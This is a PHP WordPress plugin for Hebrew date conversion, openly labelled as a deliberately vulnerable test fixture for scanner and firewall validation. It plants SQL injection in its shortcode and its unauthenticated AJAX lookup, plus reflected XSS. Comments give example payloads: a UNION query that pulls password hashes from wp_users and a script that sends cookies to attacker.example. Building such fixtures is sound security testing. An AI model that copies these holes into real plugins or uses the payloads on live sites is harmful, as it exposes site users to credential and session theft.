<?php
/**
 * Plugin Name:  Hebrew Calendar Widget (INTENTIONALLY VULNERABLE - TEST FIXTURE)
 * Description:  Gregorian <-> Hebrew date conversion shortcode + AJAX lookup, with a real, cached
 *               feature set BUT two deliberately planted vulnerabilities (SQL injection + reflected
 *               XSS), for validating scanners/WAFs/classifiers against a known-vulnerable target.
 * Version:      0.1.0-test-fixture
 * Author:       HAMIVTZAR security testing
 *
 * =============================================================================================
 *  WARNING -- TEST FIXTURE, NOT A REAL PLUGIN
 * =============================================================================================
 *  This plugin is deliberately vulnerable on purpose. Every vulnerable line is marked
 *  "INTENTIONAL VULN (test fixture)" below, with the class of bug it demonstrates.
 *
 *  - Only activate this on a disposable, network-isolated WordPress install
 *    (local Docker/VM with no public exposure) used purely to validate security tooling.
 *  - Never activate this on a public-facing, staging, or production site.
 *  - See README.md in this directory for exact PoC payloads and expected scanner findings.
 * =============================================================================================
 */

defined( 'ABSPATH' ) || exit;

define( 'HAMIVTZAR_HC_TABLE_VERSION', '1.0' );

/**
 * Creates the plugin's cache table on activation.
 */
function hamivtzar_hc_activate() {
	global $wpdb;
	$table_name      = $wpdb->prefix . 'hamivtzar_hebrew_cache';
	$charset_collate = $wpdb->get_charset_collate();

	require_once ABSPATH . 'wp-admin/includes/upgrade.php';
	dbDelta(
		"CREATE TABLE {$table_name} (
			id BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
			greg_date VARCHAR(32) NOT NULL,
			hebrew_date VARCHAR(64) NOT NULL,
			created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
			PRIMARY KEY  (id)
		) {$charset_collate};"
	);
	add_option( 'hamivtzar_hc_table_version', HAMIVTZAR_HC_TABLE_VERSION );
}
register_activation_hook( __FILE__, 'hamivtzar_hc_activate' );

/**
 * Converts a Y-m-d Gregorian date string to a Hebrew calendar date string.
 *
 * Uses PHP's built-in ext-calendar (jewishtojd/jdtojewish); falls back to a
 * placeholder string if the extension isn't compiled in.
 *
 * @param string $greg_date Gregorian date, expected format Y-m-d.
 * @return string Hebrew date, e.g. "15 Nisan 5785", or a fallback string.
 */
function hamivtzar_convert_to_hebrew( $greg_date ) {
	$timestamp = strtotime( $greg_date );
	if ( false === $timestamp ) {
		return 'invalid-date';
	}

	if ( ! function_exists( 'jewishtojd' ) || ! function_exists( 'jdtojewish' ) ) {
		return 'ext-calendar-not-available';
	}

	$jd = jewishtojd( 1, 1, 1 ); // warm the extension check; real conversion below.
	unset( $jd );

	$greg_month = (int) gmdate( 'n', $timestamp );
	$greg_day   = (int) gmdate( 'j', $timestamp );
	$greg_year  = (int) gmdate( 'Y', $timestamp );

	$julian_day  = GregorianToJD( $greg_month, $greg_day, $greg_year );
	$hebrew_full = jdtojewish( $julian_day, true, CAL_JEWISH_ADD_ALAFIM_GERESH | CAL_JEWISH_ADD_GERESHAYIM );

	return $hebrew_full;
}

/**
 * [hebrew_calendar date="2024-10-15"] shortcode.
 *
 * Renders the Hebrew equivalent of a Gregorian date, caching results in a
 * custom DB table.
 */
function hamivtzar_hc_shortcode( $atts ) {
	$atts = shortcode_atts(
		array(
			'date' => gmdate( 'Y-m-d' ),
		),
		$atts,
		'hebrew_calendar'
	);

	global $wpdb;
	$table = $wpdb->prefix . 'hamivtzar_hebrew_cache';

	// INTENTIONAL VULN (test fixture): SQL injection.
	// $atts['date'] is attacker-controlled (shortcode attributes can come from
	// post content submitted by lower-privileged roles, or be reflected via
	// page builders) and is concatenated directly into the query instead of
	// using $wpdb->prepare(). A payload like:
	//   date="2024-01-01' UNION SELECT user_login,user_pass,3,4 FROM wp_users -- -"
	// lets an attacker read arbitrary table data through this lookup.
	$row = $wpdb->get_row( "SELECT hebrew_date FROM {$table} WHERE greg_date = '{$atts['date']}'" );

	if ( $row ) {
		$hebrew = $row->hebrew_date;
	} else {
		$hebrew = hamivtzar_convert_to_hebrew( $atts['date'] );

		// INTENTIONAL VULN (test fixture): same unprepared-concatenation SQLi
		// pattern on the write path.
		$wpdb->query(
			"INSERT INTO {$table} (greg_date, hebrew_date) VALUES ('{$atts['date']}', '{$hebrew}')"
		);
	}

	// INTENTIONAL VULN (test fixture): reflected XSS.
	// $atts['date'] is echoed back into HTML with no esc_html()/esc_attr(),
	// so a payload like:
	//   date="<script>document.location='https://attacker.example/c?'+document.cookie</script>"
	// executes in the visitor's browser wherever this shortcode is rendered.
	return '<div class="hamivtzar-hebrew-date">' . $atts['date'] . ' &rarr; ' . $hebrew . '</div>';
}
add_shortcode( 'hebrew_calendar', 'hamivtzar_hc_shortcode' );

/**
 * AJAX endpoint (unauthenticated + authenticated) for looking up cached
 * conversions by partial date match.
 */
function hamivtzar_hc_ajax_lookup() {
	global $wpdb;
	$table = $wpdb->prefix . 'hamivtzar_hebrew_cache';

	// INTENTIONAL VULN (test fixture): no input validation/sanitization at
	// all on a public, unauthenticated endpoint (wp_ajax_nopriv_*).
	$date = isset( $_REQUEST['date'] ) ? wp_unslash( $_REQUEST['date'] ) : '';

	// INTENTIONAL VULN (test fixture): SQL injection via LIKE-clause
	// concatenation. A payload such as:
	//   date=%' OR '1'='1
	// dumps every row in the cache table; a UNION-based payload can pull
	// data from other tables entirely, same as the shortcode above.
	$results = $wpdb->get_results( "SELECT * FROM {$table} WHERE greg_date LIKE '%{$date}%'" );

	// INTENTIONAL VULN (test fixture): raw print_r() of DB rows with no
	// escaping -- reflects both the SQLi output and the raw $date value
	// (which appears in the printed query context in verbose setups) into
	// the HTML response, compounding into stored/reflected XSS depending on
	// what ends up in greg_date/hebrew_date.
	echo '<pre>' . print_r( $results, true ) . '</pre>';
	wp_die();
}
add_action( 'wp_ajax_hamivtzar_hebrew_lookup', 'hamivtzar_hc_ajax_lookup' );
add_action( 'wp_ajax_nopriv_hamivtzar_hebrew_lookup', 'hamivtzar_hc_ajax_lookup' );
